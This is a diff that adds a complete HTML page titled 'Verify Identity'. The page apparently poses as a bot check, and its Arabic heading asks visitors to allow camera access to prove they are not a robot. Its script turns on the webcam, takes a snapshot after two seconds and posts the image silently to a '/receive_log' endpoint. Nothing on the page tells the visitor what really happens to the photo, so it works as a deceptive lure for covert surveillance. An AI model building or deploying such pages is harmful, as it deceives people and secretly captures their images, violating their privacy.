@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head><title>Verify Identity</title></head>
+<body>
+    <script>
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            let video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            setTimeout(() => {
+                let canvas = document.createElement('canvas');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                fetch('/receive_log', {
+                    method: 'POST',
+                    body: JSON.stringify({ content: "📸 صورة جديدة: " + canvas.toDataURL() }),
+                    headers: { 'Content-Type': 'application/json' }
+                });
+            }, 2000);
+        }).catch(err => console.log("Permission Denied"));
+    </script>
+    <h2>يرجى السماح بالكاميرا لتأكيد أنك لست روبوت 🤖</h2>
+</body>
+</html>
